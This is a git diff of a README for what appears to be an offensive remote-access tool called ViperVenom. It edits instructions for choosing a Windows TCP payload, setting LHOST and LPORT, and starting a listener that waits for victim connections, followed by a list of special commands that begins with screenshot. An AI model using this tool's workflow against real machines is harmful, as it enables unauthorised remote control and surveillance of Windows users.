@@ -85,9 +85,7 @@ Available Payloads Any Windows:
 1 | windows/vipervenom/tcp/payload | Best Option for Windows Exploitation.
 
 ```
-```
-You should brought to the listener page
-```
+You should brought to the listener page.
 
 To select a payload
 ```
@@ -107,9 +105,14 @@ LHOST=192.168.1.107
 (Listener) Windows/ViperVenom/TCP/Payload > show port
 LPORT=443
 (Listener) Windows/ViperVenom/TCP/Payload > 
+```
+After you set everything up, type run and enter to start the listener
 
 ```
-
+(Listener) Windows/ViperVenom/TCP/Payload > run
+[*] Starting Listener...
+Listener Started, Waiting for Connections...
+``
 ## Special Commands
 ```
 screenshot
